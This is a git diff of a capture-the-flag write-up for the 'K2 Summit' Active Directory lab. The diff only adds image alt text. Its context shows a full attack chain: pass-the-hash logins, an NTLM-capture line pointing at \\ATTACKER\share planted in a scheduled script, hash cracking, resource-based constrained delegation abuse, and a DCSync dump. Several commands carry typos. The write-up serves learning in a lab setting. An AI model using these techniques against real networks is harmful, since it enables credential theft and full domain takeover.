@@ -32,7 +32,7 @@ I performed an **nmap** aggressive scan on the target to find open ports and ser
 nmap -A -p- TARGET --min-rate 10000 -oN summit.nmap
 ```
 
-![](https://cdn.ziomsec.com/k2-summit/1.webp)
+![performing an nmap scan on summit machine](https://cdn.ziomsec.com/k2-summit/1.webp)
 
 ## Initial Foothold
 
@@ -42,7 +42,7 @@ I used the usernames found on middle camp to enumerate valid users on this syste
 kerbruet userenum --dc TARGET -d k2.thm creds/userlist2
 ```
 
-![](https://cdn.ziomsec.com/k2-summit/2.webp)
+![finding a valid user](https://cdn.ziomsec.com/k2-summit/2.webp)
 
 I then tried the passwords and hash that I had found on **middle camp** and **base camp** against *j.smith* user and found that the **middle camp** administrator hash was valid.
 
@@ -51,7 +51,7 @@ netexec smb TARGET -u 'j.smith' -H 'HASH'
 netexec winrm TARGET -u 'j.smith' -H 'HASH'
 ```
 
-![](https://cdn.ziomsec.com/k2-summit/3.webp)
+![bruteforcing user credentials](https://cdn.ziomsec.com/k2-summit/3.webp)
 
 I then accessed the machine using **evil-winrm**.
 
@@ -59,7 +59,7 @@ I then accessed the machine using **evil-winrm**.
 evil-winrm -i TARGET -u 'j.smith' -H 'HASH_LM'
 ```
 
-![](https://cdn.ziomsec.com/k2-summit/4.webp)
+![connecting to the target wth winrm](https://cdn.ziomsec.com/k2-summit/4.webp)
 
 I identified found another user on the system called *o.armstrong* from the `Users` directory. The `C:\` directory contained an interesting directory called *Scripts*. It contained a script that copied the contents from *o.armstrong*'s desktop to documents.
 
@@ -67,7 +67,7 @@ I identified found another user on the system called *o.armstrong* from the `Use
 cat C:\Scripts\backup.bat
 ```
 
-![](https://cdn.ziomsec.com/k2-summit/5.webp)
+![viewing backup script](https://cdn.ziomsec.com/k2-summit/5.webp)
 
 This was likely a scheduled task. If I could modify this, I could execute commands as *o.armstrong*. So, I looked at my permissions and found that I had privileges on the *Scripts* folder. I could replace the script with a custom one which would allow me to execute commands of my choice.
 
@@ -76,7 +76,7 @@ icacls backup.bat
 icacls C:\Scripts
 ```
 
-![](https://cdn.ziomsec.com/k2-summit/6.webp)
+![enumerating perms to modify the batch script](https://cdn.ziomsec.com/k2-summit/6.webp)
 
 So, I renamed the original script and tried adding a reverse shell payload in a new *backup.bat* script. However, I was blocked by antivirus. Instead of getting a reverse shell, I tried capturing the NTLM hash by making the user try and access a share. While accessing the share, the user would authenticate with their NTLM hash and hence I could capture it.
 
@@ -84,7 +84,7 @@ So, I renamed the original script and tried adding a reverse shell payload in a 
 Add-Content -Path C:\Scripts\backup.bat -Value "\\ATTACKER\share"
 ```
 
-![](https://cdn.ziomsec.com/k2-summit/7.webp)
+![add payload to batch script](https://cdn.ziomsec.com/k2-summit/7.webp)
 
 I started responder and after some time, received *o.armstrong*'s NTLM hash.
 
@@ -92,7 +92,7 @@ I started responder and after some time, received *o.armstrong*'s NTLM hash.
 responder -I tun0
 ```
 
-![](https://cdn.ziomsec.com/k2-summit/8.webp)
+![receiving ntlm autentication request](https://cdn.ziomsec.com/k2-summit/8.webp)
 
 I saved the hash in a file and cracked it using **john**.
 
@@ -100,7 +100,7 @@ I saved the hash in a file and cracked it using **john**.
 john --wordlists=/usr/share/wordlists/rockyou.txt hash
 ```
 
-![](https://cdn.ziomsec.com/k2-summit/9.webp)
+![cracking the hash with john](https://cdn.ziomsec.com/k2-summit/9.webp)
 
 Finally, I accessed the system as *o.armstrong*.
 
@@ -108,11 +108,11 @@ Finally, I accessed the system as *o.armstrong*.
 evil-winr -i TARGET -u 'o.armstrong' -p 'arMStronG08'
 ```
 
-![](https://cdn.ziomsec.com/k2-summit/10.webp)
+![accessing the machine as o.armstrong user](https://cdn.ziomsec.com/k2-summit/10.webp)
 
 I then captured the user flag from *Desktop*.
 
-![](https://cdn.ziomsec.com/k2-summit/11.webp)
+![capturing the user flag](https://cdn.ziomsec.com/k2-summit/11.webp)
 
 ## Privilege Escalation
 
@@ -122,15 +122,15 @@ I used *o.armstrong*'s credentials to enumerate the system with **bloodhound**.
 bloodhound-python -d 'k2.thm' -u 'o.armstrong' -p 'arMStronG08' -c all -ns TARGET --zip
 ```
 
-![](https://cdn.ziomsec.com/k2-summit/12.webp)
+![enumerating the target domain](https://cdn.ziomsec.com/k2-summit/12.webp)
 
 I discovered that our user *o.armstrong* had **GenericWrite** permission over the *K2ROOTDC.K2.THM* account.
 
-![](https://cdn.ziomsec.com/k2-summit/13.webp)
+![enumerating the target domain](https://cdn.ziomsec.com/k2-summit/13.webp)
 
 Hence, I could exploit this using **resource based constraint delegation**.
 
-![](https://cdn.ziomsec.com/k2-summit/14.webp)
+![exploiting rbcd](https://cdn.ziomsec.com/k2-summit/14.webp)
 
 I first created a computer account. And then gave it permission for delegation. This account could act on behalf of other accounts (even domain admins).
 
@@ -140,7 +140,7 @@ impacket-addcomputer -method SAMR -computer-name 'EVIL$' -computer-pass 'Pass@12
 impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'K2ROOTDC$' -action 'write' 'K2.THM/o.armstrong:arMStronG08'
 ```
 
-![](https://cdn.ziomsec.com/k2-summit/15.webp)
+![creating an account for exploit](https://cdn.ziomsec.com/k2-summit/15.webp)
 
 I then requested a service ticket (TGS) to access `cifs` of *k2rootdc.k2.thm* on behalf of administrator and exported the ticket to the **KRB5CCNAME** variable.
 
@@ -150,7 +150,7 @@ impacket-getST -spn "cifs/k2rootdc.k2.thm" -impersonate 'administrator' 'k2.thm/
 export KRB5CCNAME=administrator@cifs_k2rootdc.k2.thm@K2.THM.cacche
 ```
 
-![](https://cdn.ziomsec.com/k2-summit/16.webp)
+![exploiting the misconfig](https://cdn.ziomsec.com/k2-summit/16.webp)
 
 Finally, I performed DC-SYNC / dumped secrets using the kerberos ticket and found the administrator hash.
 
@@ -158,7 +158,7 @@ Finally, I performed DC-SYNC / dumped secrets using the kerberos ticket and foun
 impacket-secretsdump -k -no-pass 'k2.thm/Administrator@k2rootdc.k2.thm'
 ```
 
-![](https://cdn.ziomsec.com/k2-summit/17.webp)
+![dumping all hashes with dc-sync](https://cdn.ziomsec.com/k2-summit/17.webp)
 
 I then accessed the target as *administrator* and captured the root flag.
 
@@ -166,7 +166,7 @@ I then accessed the target as *administrator* and captured the root flag.
 evil-winrm -i TARGET -u 'administrator' -H 'HASH'
 ```
 
-![](https://cdn.ziomsec.com/k2-summit/18.webp)
+![capturing the root flag](https://cdn.ziomsec.com/k2-summit/18.webp)
 
 That's it from my side!
 Until next time :)
